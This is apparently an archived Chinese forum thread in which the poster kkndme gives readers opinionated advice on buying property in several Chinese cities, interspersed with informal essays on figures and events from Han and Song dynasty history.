<p>关注本贴多日，非常欣赏楼主的睿智和理性。<br>小女子也是上海众多买房人之一，目前所谓单身剩女，得家人支持有一百五十万的首付金。基本确定买在内环交通方便的次新房（老公房停车太成问题）。<br>对上海浦西内环内的诸多区位和楼盘做过研究，发现离地铁近的同时能有苏州河景观的房源最具性价比，满足交通性和景观稀缺性的双重优势（上海内环内几乎没什么安静同时又具有自然资源的地方）。<br>现在基本确定了两个小区，比较纠结的问题有两个。<br>第一个问题，一个是小区管理和区位优势明显单价在3万3左右，另一个区位和管理比较差，名声不好，但是面苏州河的独一无二景观，单价在3万左右。从小区管理的角度，我也认可楼主的看法，管理好的小区升值空间大，管理差的小区由于群租问题严重，目前价格偏低，但是这个软件问题在日后随着自住率的提高貌似也能解决。究竟我该选一个景观资源非常稀缺的管理和配套相对较差的小区，还是一个相对成熟价格稍高同时综合配套比较好的小区？那个小区比较有保值和投资优势？<br>第二个问题，目前的月收入税后刚过万元，如果拿150万的首付买一房大概80平左右，是比较轻松的，月供不成问题（目前租的一室一厅租金3500，已经可以做为还贷资金了）。但是考虑长远问题和一些小户型的局限性，非常想投资一套能长久居住的两房甚至三房（众所周知，一个小区里好的位置总是留给最大的户型）。这样的话，大概一套就要在320万甚至350万，我需要每月还贷1万2左右，基本和我的月工资持平。从个人观点来看，我比较想冒这个风险，比较合适的做法是首付降低到3成左右，留出三十万左右的还贷资金用以应付前面两至三年的还贷。由于目前单身，两至三年后也许家庭收入就可以完全承受这个月供。即使还是单身，目前事业发展良好，对2年后的收入在2万以上很有信心，因此还是认为可以目前阶段多点勇气，目光长远，以保证日后生活安康。<br>不知道楼主怎么看这个问题？如果是房价持续上涨的情况，也许更该相信我的工资也会持续上涨，是否我看问题太乐观？贷款200万的风险是不是会太大？</p>
<p><strong>kkndme：</strong></p>
<p>第一个问题：物业管理对于小区的价值起着至关重要的作用，好的物业管理才能让人居住舒适，这一点是非常重要的。软件的提升往往比硬件的提升难度更大。物业很差的景观楼盘，可以比喻为鲜花丛中的一坨屎，周边环境再好，它也是一坨屎。一坨屎能否脱胎换骨变成黄金，存在着较大的不确定性。<br>第二个问题：是否承受较高月供，取决于你对未来的预期，所以你要仔细分析你的行业前途，如果你所处的行业告诉成长，或者你的能力职位将得到进一步提升，你可以承受较高的月供。<br>一般来说月供不要超过全部收入的70%，如果超过这个边际，就会有较大风险。</p>
</blockquote>
<h2 id="收紧住房贷款"><a href="#收紧住房贷款" class="headerlink" title="收紧住房贷款"></a>收紧住房贷款</h2><blockquote>
<p><strong>welldayzwb：</strong></p>
<p>顶楼主，越读越觉得受益良多<br>楼主分析一下，最近几年一线城市是否会一直收紧贷款，想改善住房是否也得必须全款了？一想起这个就很郁闷，去年机会没利用好，后面不仅仅是经济成本的问题了，又面临和无房空空类似的问题，攒钱永远赶不上房价了。。。</p>
<p><strong>kkndme：</strong></p>
<p>收紧住房贷款起码在未来的一段时间会成为常态。由于货币泛滥，一次性付款的人群数量庞大，收紧贷款虽然不能降低房价，但可以抑制房价上涨的速度，防止商品房卖给穷人，以规避金融风险，对社会稳定和经济平稳增长都是有利的。</p>
</blockquote>
<h2 id="奸臣蔡京"><a href="#奸臣蔡京" class="headerlink" title="奸臣蔡京"></a>奸臣蔡京</h2><p>现代的纸币发行成本很低，拿着印钞机印就是了。古代就没那么好办，金银的开采量是有限的，别说金银，就是铸铜钱用的铜，也不是想要多少就有多少。</p>
<p>古代要想制造通货膨胀，最绝的办法就是拿一个铜钱当十个铜钱花，叫做当十大钱。搞当十大钱，扰乱货币秩序的领导，最有名的就是蔡京。</p>
<p>蔡京这个名字并不陌生，不爱读历史的人也一定看过水浒传。就是这个领导，被宋史称为六贼之首。大家一提起他，就自然把他跟奸臣划了等号，恨不得在他脸上踹几脚。</p>
<p>蔡京的确是个奸臣，但很多人可能不知道的是：蔡京是王安石的最得力干将，他的很多祸国殃民的政策，竟然是源于恢复王安石的变法。</p>
<p>王安石可以说是一个品德高尚的人，但是变法的流毒，竟直接导致了北宋的灭亡。王安石是一个在历史上有争议的任务，但是他的得力骨干蔡京同志，却是不折不扣的奸臣。</p>
<p>蔡京领导的罪恶，大家一致公认的就是那么几条<br>第一、花石纲，水浒传有精彩的描述，这个纯属于皇帝的个人爱好，似乎都推到蔡领导身上比较冤枉。<br>第二、大兴土木，大搞基础设施建设拉动内需，顺便搜刮点民财，以至于百姓怨愤<br>第三、恢复王安石时期的方田法，并且更改盐法茶法，国库和官员一起大肆搜刮民财，与民争利，结果租税混乱，富人把负担全部转嫁给穷人，穷苦百姓的负担更加沉重。<br>第四、就是当十大钱，制造通货膨胀，严重扰乱金融秩序和金融安全，北宋的经济崩溃了<br>蔡京，一个王安石变法的坚定执行者，最后成为祸国殃民的奸贼。</p>
<p>关于蔡京的奸臣形象，到了现在，有人企图为他翻案。但终究声音比较弱小。<br>因为在中国的古代，肆意敛财、大兴土木、搞官商垄断，与民争利，以至于人民不堪重负的领导，都被称为奸臣。对于减轻人民赋税，不胡乱插手民间生产和贸易，让人民修养生息的，被称为贤臣。<br>中国的古代，奸臣远远多于贤臣。</p>
<h2 id="体制内的28原则"><a href="#体制内的28原则" class="headerlink" title="体制内的28原则"></a>体制内的28原则</h2><blockquote>
<p><strong>facetowall：</strong></p>
<p>有人说，高校里20%的人掌握着80%的资源和财源，本人深有同感。所以经常想怎样才能成为20%里面的人。每天也很努力工作着，科研教学也可以，但是总看不到希望。</p>
<p><strong>kkndme：</strong></p>
<p>从一个小吏变成中高级干部，是需要深入研究中国古代政治斗争史的。否则就变成了宋江，企图另立山头通过跳槽达到目的，最终的结果只能是失败。宋江是一个政治上的白痴。<br>还有一个白痴叫贾谊，我们所熟知的“过秦论”的作者，才高八斗，政治却很白痴。被文帝做了棋子。如果贾谊同志知道晁错的下场，是无论如何不会仗着有才胡说八道，口无遮拦的</p>
</blockquote>
<h2 id="贾谊"><a href="#贾谊" class="headerlink" title="贾谊"></a>贾谊</h2><p>贾谊的粉墨登场，是有很深的政治大背景的。<br>首先要从吕雉死翘翘，以陈平、周勃为首的功臣集团铲出了吕氏一党说起。<br>吕氏一党灰飞烟灭，小皇帝是个吕雉制造出来的傀儡，甚至跟高祖刘邦都没有任何血缘关系。<br>难题是让谁当皇帝呢？<br>于是中国历史上最为搞笑的一幕发生了，在高祖刘邦的子孙中要搞最弱外戚选举。</p>
<p>大概是被吕雉专权搞怕了，大家推举皇帝，专门看哪个皇子的外戚弱。于是众人的目光投向了刘邦的第四个儿子，代王刘恒。原因是刘恒的母亲薄氏出身低微，为人又很低调，堪当最弱外戚之名望。<br>提起薄氏，野史里记载的很香艳，很可以拍三级片</p>
<p>野史里说，楚汉争霸时期，高祖刘邦大败。<br>薄氏还是个姑娘的时候叫薄姬，逃难的时候占领了一个无人居住的民宅。忽然有一天看见一个浑身是血，穿着盔甲拿着兵器的男人闯进了自己的屋子，这个人就是刘邦。<br>薄姬听到后面有追兵，就把刘邦的盔甲和兵器藏了起来。然后放了一大桶洗澡水，把自己和刘邦脱光光，洗起了鸳鸯浴。追兵闯了进来，惊奇的看了一通三级片，然后走人。<br>这个只是野史，可信度不高，但是说明了薄氏的低微出身。</p>
<p>不管怎麽说，有着最弱外戚称号，并且做事很低调的刘恒当了皇帝。但是对于刘恒来说，陈平、周勃等功臣集团有着很高的声望，齐王刘襄是高祖长孙并且在铲除吕党是很有功劳，声望也很高，受到了很多人的支持，而刘恒却毫无功劳，因为功臣集团平衡关系，天上掉下了皇帝的帽子，砸在自己脑袋上。<br>所以刘恒必须提拔自己人，这个人不能有很高的功劳，也不能有结党的嫌疑，最好比较有本事能治理国家，于是大才子贾谊粉墨登场了</p>
<p>贾谊同志很有口才，一腔热血，要到现在来说最适合搞传销或者卖保险。<br>贾谊同志激愤起来甚至说：自己完全可以带兵打仗，灭了匈奴，把匈奴王象狗一样牵回来。”刘恒很贤德，但也很老谋深算，当然认为贾谊同志满嘴喷粪，所以一笑置之。<br>贾谊同志的胆子不是一般的大，向皇帝刘恒提供了一个深的帝心的建议：让所有的诸侯王滚回自己的封地。<br>为什么说这是深得帝心的建议？因为朝里功劳大的人太多，居功自傲，而自己却没有什么威望和功绩，如果功臣集团和齐王、淮南王联合起来造反怎么办？<br>所以，最好的办法就是让诸侯王滚回封地。汉代的诸侯王可跟周朝不同，周朝的诸侯王是有实权的，有自己的军队。而汉代的诸侯王只能收收领地的税，军政事务全说了不算。<br>这个事，从贾谊嘴里说出来最好不过。</p>
<p>汉代的京城是最繁华的，有全国最好的教育、医疗、商业，有钱人的天堂，大臣们都可以花天酒地。让诸侯王回到封地，大家都不干了，回封地有什么好？房价又低，又没什么娱乐，漂亮姑娘也不好找，偏远的地方气候还不好，梅雨一来全身都要发霉。<br>首先带头反对的是功臣集团的领袖周勃（陈平已经死翘翘了）。在历朝历代，多数皇帝并不是想干什么就干什么的。既然所有大臣都反对，那就先暂且作罢。<br>但是贾谊，已经为刘恒种下了希望的种子，给自己埋下了祸根。<br>贾谊注定了只能是一颗棋子。</p>
<p>贾谊的建议没有被采纳，估计很郁闷，成天滔滔不绝的演讲，甚至建议刘恒削藩，要是贾谊知道晁错的下场，一定不敢这么建议。<br>这时候，贾谊已经得罪光了朝中几乎所有的大臣。于是大家的不满全部转移到贾谊的身上。<br>刘恒要的就是这个效果。</p>
<p>随着政权的逐渐稳固，刘恒把矛头指向了周勃。给予周勃最高的赏赐，却经常在治理国家方面，询问一些周勃不可能知道的问题。让周勃很尴尬。<br>周勃有个门客，就对周勃说：“皇帝经常给你很多赏赐，您就安心的接受，这很危险。皇帝给你的赏赐越多，说明皇帝对您越不放心啊。”<br>功高震主，弄不好会有杀身之祸，周勃不是傻子，立刻明白了这个道理。所以周勃才能称的上除曹参外，最有政治头脑的武将，最后得了善终。<br>于是周勃就上表辞职，表示年老体病干不动了。周勃还期望皇帝能挽留一下，但皇帝一点挽留的意思都没有，立刻同意了。<br>刘恒让周勃起个带头作用，回到自己的封地去吧。并且赐予了大把的金银。其他诸侯王看周勃都走了，也扛不住了，只好都回到了封地，这叫射人先射马，擒贼先擒王。<br>刘恒为了安抚大家，把遭人恨的贾谊明升暗降，贬到了长沙，从此离开了政治中心。<br>后来有一天，刘恒想起了贾谊，找他来中央谈话。贾谊一见皇帝立刻滔滔不绝，把皇帝立马侃晕了。<br>刘恒想：我靠，这厮死不悔改，留着没用，有多远滚多远吧。<br>再次把贾谊贬到了梁国。<br>贾谊不多久就死了。</p>
<p>关于魏豹和薄姬是否有一腿，也不好就肯定，也是个悬疑。因为记载薄姬的版本太多，我国古代人也比较八卦，呵呵。</p>
<h2 id="kkndme-推荐的历史书"><a href="#kkndme-推荐的历史书" class="headerlink" title="kkndme 推荐的历史书"></a>kkndme 推荐的历史书</h2><blockquote>
<p><strong>welldayzwb：</strong></p>
<p>这个帖子最大的感受就是应该认真读一下历史了，麻烦楼主给列个入门级的书单，鉴于我的历史水平只有演艺级的，书单请尽量入门级，当然演绎过的就免了，别读历史还别人顺带洗脑，比较郁闷了</p>
<p>先再次表示感谢！</p>
<p><strong>kkndme：</strong></p>
<p>比较浅显的是“史记”，入门级基本都读的懂。如果开始觉得部头太大，觉得累，刚开始可以从“古文观止”入门。逐渐增加难度。<br>入门以后，很多古文就好读了。<br>现代翻译的一般都加工的比较多，同一部历史可能有无数个解释。象易中天和当年明月，都是写的不错的。</p>
<p>关于古文观止，很多文章都曾被节选进中小学课本，篇篇堪称经典，其中就包括贾谊的“过秦论”。不看过秦论真的不知道贾谊的才华呀。所以想读读历史的童鞋，不妨回过头再温习温习古文观止，边品茶边看，真是一种享受。</p>
</blockquote>
<p><strong>EchoMa9999：</strong></p>
<p>楼主晚上好！<br>我看之前有跟贴的朋友提过，请楼主列个史书入门级的书单，我不求列了很多书的书单，只请楼主推荐三本，佛渡有缘人，楼主，望不吝赐书名，先谢了！</p>
<p><strong>kkndme：</strong></p>
<p>我觉得读史最基本的就是古文观止，读了古文观止，有了功底，再读其他的就好读了。<br>开始读的时候，通史类是很难看得进去的，象“资治通鉴类”的也不好读，因为“资治通鉴”应当算评史算不上史书。<br>入门开读的话还是选择文学性强的比较好读，故事性趣味性都高，比如“史记”“三国志”“汉书”。<br>有了兴趣再读大部头的“宋史”“明史”<br>现代编写的中国史纲之类的就不要读了，纯粹洗脑，很多加工过的历史类读物就是瞎扯。</p>
<p>特别是： 千万不要读“中国通史”那样的垃圾!!!!!!!!</p>
<p>一定要读懂原文，跟中国通史讲得完全不是一回事。读不懂原文宁可不读，也不要让中国通史洗脑。</p>
<h2 id="年轻人要早买房"><a href="#年轻人要早买房" class="headerlink" title="年轻人要早买房"></a>年轻人要早买房</h2><blockquote>
<p><strong>GGKMM：</strong></p>
<p>看了三天，终于看完了。。有些是一眼带过的，有些是比较认真的看下来的；</p>
<p>感觉回帖的筒子大多数都挺有钱的啊，至少相对我来说。因为都在计划一二百万的房子了。</p>
<p>本人在福州，目前月薪只有4K，但是福州市区的房产均价已经越过一万了，市中心的更是到了1.5万这样高不可及的地步。我就那楼主口中那种民企私企的体制外的P民了，属于自生自灭型的。但也还是得活下去啊，今年也二十五了，过两年也要结婚了。房子成为不可避免的头等大事；</p>
<p>不知道楼主对福州这样一个三线或者四线城市的房产怎么看待？平均工资水平约2000，有钱人据自己观察应该不少，至少超过20%的福州人口（有关这个，从大街上越来越多的好车做判断的，或许数字不准，但有钱人不少是肯定的）。如果在郊区能找到六千左右的小户型（65平左右），首付（还得存两年或者去借钱）自己掏，剩下的做货款，因为家里实在是没办法再支援了。这样的话应该还可承受，前提是付房贷的这二十年或者十五年里不失业。。</p>
<p>希望楼主给分析分析，写得有点乱。。。</p>
<p><strong>kkndme：</strong></p>
<p>25岁不是考虑失业的年龄，35岁体制外没有混出来的群众才应该考虑失业问题。<br>所以房子一定要趁年轻买，刚开始钱不够，就不要计较太多，先买个小的，以后有能力再换，如果没混出来，以后起码有个自己的窝住。不至于租房子被人赶出来。</p>
<p>福州是有点尴尬，明明是省会，又比不过厦门，不过市区1万左右的房价，在省会城市里真的谈不上高。你是自住，你又不打算去厦门生活，所以你该买还是得买。福州的房价也许涨得没那么块，但是也不可能跌。</p>
</blockquote>
<h2 id="不要低估通货膨胀"><a href="#不要低估通货膨胀" class="headerlink" title="不要低估通货膨胀"></a>不要低估通货膨胀</h2><p><strong>someway2010：</strong></p>
<p>跟楼主请教一下：<br>楼主怎么看知春里小区的房子？那边连着双榆树小区，有大片的老房子，都是6层的板楼，都是上世纪8、90年代建的。环境看起来有点乱，以前的老公房，原单位早就没了，物业基本等于没有。将来拆迁的可能性有多大？值得买不？</p>
<p><strong>kkndme:</strong></p>
<p>只要是4环内保值升值不会有问题，那个位置还是可以。关键是看投资还是自住，如果是自住，我就觉得那边有点乱糟糟的，不舒服。挨着中关村其实住着都不舒服，但不耽误升值。</p>
<p><strong>someway2010：</strong></p>
<p>多谢楼主，是自住<del>因为老公在中关村上班，想离公司近些，所以就挑了那里</del>是挺乱的，唉~<br>希望以后等我们有钱了能换个别的地方的大房子，不过按照楼主的分析这个是极有可能实现不了了。。。5555~~~~~~<br>再问一个，现在市场上卖200w的房子，十年后大概会涨到多少钱？麻烦楼主</p>
<p><strong>kkndme:</strong></p>
<p>80年代你想象不出以后一瓶茅台会卖1000块<br>现在你同样想象不出十年后你的房子能卖多少钱。<br>那时也许人民币都是1000块一张的</p>
<h2 id="二三线城市与重庆"><a href="#二三线城市与重庆" class="headerlink" title="二三线城市与重庆"></a>二三线城市与重庆</h2><p><strong>dali_05：</strong></p>
<p>浏览了楼主观点，和我之前的货币推动楼市的看法完全一致<br>但由于无法像楼主那样掌握一些基础数据，对一些楼市的演变细节还有几个疑问</p>
<p>，还请lz指点<br>（1）二三线城市在这轮调控中的增长不出意料，但是二三线城市的房价增长，我</p>
<p>始终认为存在一个最终谁接盘的问题。我是重庆人，以重庆为例，这个城市代表</p>
<p>了典型的二三线城市。外来人口少，特别是外来的普通白领阶层。据我了解的数</p>
<p>据，2008年之前，重庆的具备房子购买力的人群任然是净流出。到08年后才得以</p>
<p>改观。但是流入任然缓慢，这也就是意味着重庆的楼市将没有长期稳定的接盘群</p>
<p>体。而本地人，没有房子的是非常少的。在没有外来人群接盘的情况下，本地人</p>
<p>在有房的情况下，任然投资囤积房产，最终，这些房产将如何变现。<br>一句话，房价要持续的上涨，还得有没房者接盘，而且这些人还得要有购买</p>
<p>力。多次购房者无法稳定的解决这个问题。那么我就有理由对这样的二三线城市</p>
<p>的房产前景表示担忧。</p>
<blockquote>
<p><strong>kkndme:</strong></p>
<p>重庆房价的上涨得益于zy的战略规划，打造中国的大后方，把重庆的经济发展提升到了政治的高度。因为如果发生战争，重庆将变成第二首都，是中国最安全的大后方，蒋同志就很有眼光的选择过重庆。<br>重庆并不是以城中心为核心向外辐射的城市，繁华区域相对比较分散，所以房价很难快速上涨。这也就是过去重庆长期滞涨的原因。<br>重庆房价的崛起可以说完全是中央规划概念推动的，至于日后是否会吸引大量的精英和富人来重庆发展，我想一定可以。作为上升到国家政治高度的发展计划，就算是代价再大，也一定会搞得起来。<br>二三线城市房价的支撑，要因城市而异的，大体上二三线城市的核心区域与高端住宅区都不会有问题。毕竟一线城市的体量，不可能满足全国中产以上群体定居，而且一线城市随着竞争的日益激烈，钱也不是那么好赚的。有很大比例的富裕人群仍会选择二三线城市生活。<br>中国的二三线城市的富裕人口，要比大家想象的多的多，特别是二三线城市，有相当比例的人口都有较高的隐性收入，权力寻租现象更为严重。<br>关于中国的房产能够持有多少年的问题，这要持续观察zf的动向。对于现在的80后来说，如果在有生之年能够平安度过，不经历大的动乱，已经是很值得庆幸了。<br>如果有动乱发生，即使你没有买房，你手中的现金也将变成废纸。</p>
</blockquote>
<p>（2）高端房产还是普通住宅？<br>看了lz的观点，认为高端房产，由于其稀缺性，更具价值。<br>但我认为，房产和古玩还是存在差别的。古玩最大的价值在于收藏把玩，只要</p>
<p>有钱，买再多古玩来玩都无所谓。但是房产不一样，房产的价值除了和古玩一样</p>
<p>的投资外，真正的功能在于居住。但是目前的二三线城市，精英阶层的数量是非</p>
<p>常有限的，他们谁没个3，5套别墅，在没有外来精英加入购买的前提下，这些高</p>
<p>端的房产也就是在精英圈子中流转，这样封闭的流转，如何实现价值的增长呢？<br>要知道，在2，3线城市，普通白领阶层能跳出自己的阶层而具备购买高端房产</p>
<p>能力的概率是非常小的，不具有代表性。那这些每个富人，有权人都有很多的高</p>
<p>端房产有什么价值可言？<br>而普通住宅由于有普通白领的接盘，是否投资价值更大？</p>
<p>（3）长期持有房产的变数<br>中国房产只有70年，甚至50年的使用权，如果长期持有，随着时间推移，房产</p>
<p>价值是否会受到影响。因为我在重庆，这个问题尤其严重，重庆只有50年。<br>如果我只是持有，出租。那我的租金将是较低的（相对房价而言），因为zf不</p>
<p>会允许房租像房价那样疯涨，原因和粮食问题一样，基本需求嘛。那有可能50年</p>
<p>到了，我的房租收益实际上还抵不上房款的综合支出。而那时房子早就是危房了</p>
<p>，强拆将是完全可能的情况。那做为普通人，怎么可能和zf在赔偿上博弈。这个</p>
<p>风险lz是怎么理解的？？<br>我的理解是，房子不能长期持有，必须在5年左右变现，否则将存在贬值和变现</p>
<p>难度加大的风险，请lz指点</p>
<p>（4）天津现象（或者即将出现的重庆现象）<br>天津房价在二线城市中增长是惊人的，但收入水平并没有达到那样的高度。这</p>
<p>种依靠所谓开发区吸引资金推动房价的模式，是否具备可持续性？？<br>我认为真正的天津常住精英阶层的资金实力是无法支撑这样的价格的，只能理</p>
<p>解是外来游资的介入，推高了价格。<br>我想问的是，这些游资有可能退去吗，一旦退去，面临的风险是否很大。<br>据我的理解，中国真正成功的开发区，都是由于本身的条件好，而非开发区本</p>
<p>身的作用。<br>比如深圳，享受的是经济转型的首发政策优势。上海浦东是由于本身就实力雄</p>
<p>厚。而所谓的滨海新区，重庆两江新区，本身实力就不过如此，即使要真正实力</p>
<p>上来，那也将是非常漫长的过程。那这些进入房地产的游资，将在概念炒作一遍</p>
<p>之后，获得一定收益后撤出，一旦撤出，这些地区的房价将会是怎样的趋势？<br>放眼中国，房价高的地方无不是富人集中，或周边富人多的区域。天津重庆这</p>
<p>样的地方，一旦外地资金撤出，将何去何从？</p>
<p>（5）新兴城区和老核心城区<br>新兴城区环境好，轨道交通也使得原本偏远的新兴城区变得方便起来。那老核</p>
<p>心城区的房产是否不如这样的新兴城区有价值。这个问题一直很困惑。因为我是</p>
<p>重庆人，这个问题尤其明显。现在重庆房价最高的是以前的郊区，江北，渝北。</p>
<p>而传统的渝中，房价反而排着中等水平。这和北京的一二环贵，上海的黄埔徐汇</p>
<p>贵完全不同。这样的状况具备可持续性吗，还是仅仅是阶段性的。但是感觉现在</p>
<p>zf的规划更倾向于向外发展，避免主城区拆迁的高成本，这会否导致传统主城区</p>
<p>的边缘化</p>
<p>先问这几个问题，困惑很久了，期待lz的高论</p>
<h2 id="城区和郊区"><a href="#城区和郊区" class="headerlink" title="城区和郊区"></a>城区和郊区</h2><p><strong>hey-hey：</strong></p>
<p>楼主 我在上海， 小白领一枚。最近想买房。稍微好点的区均价已经至少2万5+了， 现在考虑在其他价格洼地的区买套新房，看中了均价1万7左右，买90送30，到手面积120左右。此楼盘开发建造定位2万&#x2F;米以上，因政策调控，故现1万7。好处是小区规划不错，属大型国企房产公司，2012年交房。附近有超大型公园，地铁明年开通（升值利好），附近有医院，学校，路上看到的在建建筑较多（百废待兴）。不好处是离上班开车要1个小时，属工业区（在另外一个方向），路上集卡较多，有传空气质量不好。 </p>
<p>另外一个选择是在市中心或其他比较好的区买个小房子，大概5、60平方米左右，预算也是180万左右。 好处是地段好，租金回报可能较高。如果自住相对比较方便。</p>
<p>单身，买房投资愿望大于自住愿望。 请楼主给分析分析。谢谢</p>
<p><strong>kkndme：</strong></p>
<p>多数人买房子都是郊区买个大的，后来上班实在不方便，再想办法城里买套小的。住郊区牺牲时间，住城里牺牲面积。总得来说，还是住城里更方便些。<br>关于房价升值，一定是郊区和城区版块轮动的。当郊区房价较低时，资金就会关注价值洼地，当郊区房价炒起来以后，城区的房价跟着上涨，但总的来说，城区的房价涨幅一定高于郊区，且比郊区更抗跌。</p>
<p><strong>hey-hey：</strong></p>
<p>谢谢楼主。真是纠结阿。一样的钱想买个新点的。而且周边的觉着还有这样那样的优势，比如公园，比如现在的性价比。比如大了一倍。比如该区未来发展空间和前途。如路建好了地铁修好了，城市辐射发展的面扩展了。<br>市区现在虽然完善，但未来没什么发展空间，该发展的都饱和了该配套的都配好了。升值的空间是否相对就小了。 </p>
<p>还请楼主再给说说。</p>
<p><strong>kkndme：</strong></p>
<p>你说的其实还是性价比的问题，比如郊区（前提是配套能发展的起来）1万7，城区2万5，那肯定是选择城区，毕竟相差不大。如果郊区1万7，城区3万以上，那肯定选择郊区。<br>好比北京的通州，城区2万的时候，通州8000，肯定选择通州，升值会快。但城区3万，通州2万5的时候，肯定会选城区。</p>
<h2 id="守着金碗要饭吃"><a href="#守着金碗要饭吃" class="headerlink" title="守着金碗要饭吃"></a>守着金碗要饭吃</h2><p>守着金碗要饭吃，最典型的就是老一辈玩田黄寿山石的，收藏了一屋子石头，穷了大半辈子，第一次参加石头交易会，居然发现自己随便拿块石头出来能卖上千万。</p>
<h2 id="人制的社会，人就是制度"><a href="#人制的社会，人就是制度" class="headerlink" title="人制的社会，人就是制度"></a>人制的社会，人就是制度</h2><p>让李荣融来讲垄断巨头的功劳，这个事很有意思。</p>
<p>西汉时期，功臣集团和他们的后人势力比较大，大街上瞎晃的黑社会头子比较多，皇帝提倡以法治国，靠法律来制约功臣集团，先是重用了皇宫守大门出身的张释之大法官。<br>张法官完全按法律办事，该杀头的绝不会流放，但是该流放的也绝不会杀头。张大法官实现了我国历代百姓追求的天下无冤民的梦想。<br>史书上记录：汉文帝车驾过中渭桥，一个人从桥底下突然钻出来把皇帝的御马惊了，刘恒很生气，让张法官治他的罪。张法官审讯后发现是个意外，属于民事事件，打算罚点钱放掉。刘恒不干了，那可是惊了圣驾呀。罪该杀头。张法官却认为：律条上没有说因意外惊了圣驾就必须杀头，按律条就应该罚钱放人。要不然陛下你就不要把这个人交给我审，直接杀掉算了。既然陛下让我审，就必须按法律办事。刘恒只好按照张法官的审判结果，放掉了那个人。<br>其实，遵守法律，按照法律办事的不仅仅是张法官，而是刘恒自己。刘恒为了保证社会安定、基业长青，就必须限制特权阶层，限制特权阶层就必须依法治国。<br>但是文景之后，武帝就不满足于完全依法办事的张释之法官这样的人了，而是开始重用酷吏，张汤、义纵、宁成这些新一代法官登上了历史舞台。法律是什么？法律就是张汤，张汤就是法律，犯了法的要往死理打，没犯法的也要往死里打。<br>唐朝武则天时期，出现了一个史无前例的酷吏：来俊臣。<br>来俊臣法官不管法律专搞冤狱，专门养了一大群打手无赖，凡是武则天不喜欢的人，还有他自己不喜欢的人，一律刑讯逼供，屈打成招。发明的酷刑比张汤有过之而无不及。<br>古代，法律是什么？是皇帝？是张释之？是张汤? 是来俊臣？其实，法律什么都不是。</p>
<h2 id="准公务员的好处"><a href="#准公务员的好处" class="headerlink" title="准公务员的好处"></a>准公务员的好处</h2><p>最著名的皇宫传达室看门老大爷叫冯唐，头发都白了还在未央宫值班呢。皇帝刘恒没事瞎溜达，看见老大爷一脑袋白头发，就叫过来神侃。不侃则已，一侃才知道冯大爷的爷爷是赵国的官帅将，跟大名鼎鼎的名将李牧是哥们。而且冯大爷不愧是名将之后，太懂带兵打仗的道道了。<br>刘恒说：我要是能有李牧这样的大将，还怕什么匈奴啊。<br>冯唐很牛叉的说：就是有李牧这样的大将，也得不到重用。<br>冯大爷直接把皇帝气晕，皇帝转身就走了。<br>后来刘恒气消了，又找冯大爷问话。<br>冯大爷就说了一番大道理：<br>对待将士，要以激励为主，才能得到将士拼死效力的心。重惩罚，轻奖励，光拿大棒不掏胡萝卜，将士怎么肯用命呢？（皇帝是信奉法家的，法家的精神领袖商鞅同志认为管理手下最高境界就是基本不怎么用胡萝卜，直接用大棒的最牛——罚九赏一。）<br>云中太守魏尚是个名将，让匈奴文风丧胆。魏尚的手下都是农民子弟，魏尚对待士兵很好，很舍得犒劳，也和舍得给钱，所以大家都很拼命。但是陛下您经常因为军兵的一点小错误，就扣掉军兵的赏赐，因为魏尚虚报了几个斩获的首级数量，就把魏尚抓起来关监狱，奖励太轻，而惩罚太重了。所以说陛下有李牧这样的良将也不能重用。<br>刘恒大悟，拜冯大爷为车骑都尉。<br>唐代的王勃，很不得志，于是写了《秋日登洪府滕王阁饯别序》:“嗟乎!时运不齐，命途多舛;冯唐易老,李广难封。” 冯大爷一下子因为王勃的文学作品，家喻户晓了。</p>
<h2 id="二三线城市的发展靠拆迁"><a href="#二三线城市的发展靠拆迁" class="headerlink" title="二三线城市的发展靠拆迁"></a>二三线城市的发展靠拆迁</h2><p><strong>dali_05：</strong></p>
<p>支持楼主房价大涨房租必涨的观点</p>
<p>但是这仅限于外来人口众多的一线城市<br>二三线城市本地人几乎没有没房的，如果算上父母的，将来普遍一个家庭拥有两套以上的房子<br>房租也就失去了大涨的基础<br>唯一可导致房租上涨的就是拆迁，一旦便宜的旧房子少了，房租肯定是要上调的<br>但那也是有限的<br>总之，外来人口极其可支配收入是房租的决定性因素</p>
<p><strong>kkndme：</strong></p>
<p>二三线城市的敛财和追求政绩方式，全靠大规模拆迁，城市搞升级改造，这个拆迁规模是一线城市市民难以想象的。有的城市已经搞得如火如荼了，有的城市还没开始，但都会走这一步。</p>
<h2 id="一个忽悠了几亿中国人的伪概念：所谓“中国房地产泡沫”"><a href="#一个忽悠了几亿中国人的伪概念：所谓“中国房地产泡沫”" class="headerlink" title="一个忽悠了几亿中国人的伪概念：所谓“中国房地产泡沫”"></a>一个忽悠了几亿中国人的伪概念：所谓“中国房地产泡沫”</h2><p>中国大陆大家目前最为关心，讨论最为热烈的一个问题就是中国的房地产泡沫问题。从政府到民间，从经济专家到普通百姓，大家都在关注这个问题。以前，我也觉得中国存在一个叫“中国房地产泡沫”的所谓概念，但今天我忽然感悟，原来多少年来包括我在内的几亿中国人都被蒙骗了，中国根本就不存在所谓“房地产泡沫”的问题，“房地产泡沫”这个概念本身就是一个伪概念。</p>
<p>如同市场经济一样，房地产泡沫也是一个外来事物，它是市场经济的产物。但问题是，中国是市场经济吗？显然不是，否则为什么大多数西方国家都不承认中国是一个市场经济国家。尤其是中国大陆的房地产市场，更不是市场经济，而是计划经济与市场经济相结合的一个怪物，政府操纵着房地产行业，政府对房地产有着绝对的掌控能力。</p>
<p>房地产泡沫是市场经济的产物，既然是泡沫，那么这个泡沫也会遵循市场经济的规律，即当泡沫足够大的时候，会破裂。因为日本与美国的经济是市场经济，所以当日本与美国的房地产产生泡沫的时候，就会破裂。</p>
<p>目前包括中国在内的几乎所有世界经济学家都以为，当年日本与美国的房地产泡沫破裂了，中国的房地产泡沫比日美大几倍，当然也会破裂。事实却是，中国的房地产泡沫在几年年前的膨胀程度就超过了当年日本与美国的房地产泡沫，中国的泡沫几年来虽然翻倍，但却没有破裂，这是何故？显然，经济学家们犯了一个错误，那就是把中国的房地产乃至中国经济当成了市场经济来看待，而事实是中国的房地产市场根本不是市场经济。所以，西方市场经济国家所有的房地产泡沫，在中国也根本不存在，所谓的“中国房地产泡沫”根本就是一个伪概念。</p>
<p>当然，我说到这里时，肯定有很多人不服气，中国的房地产明明几年之内翻了很多倍，远远超过了普通人的收入水平，这不是泡沫这是什么？我的回答是，中国的房地产价格确实虚高，远远超过普通人的收入水平，这是事实，但这不是“房地产泡沫”，因为泡沫会破，而中国的这个被大家称为“泡沫”的东西却不会破，因为它的真实名字其实不叫泡沫，应该叫“变相的税收”或者“房地产垄断价格”。</p>
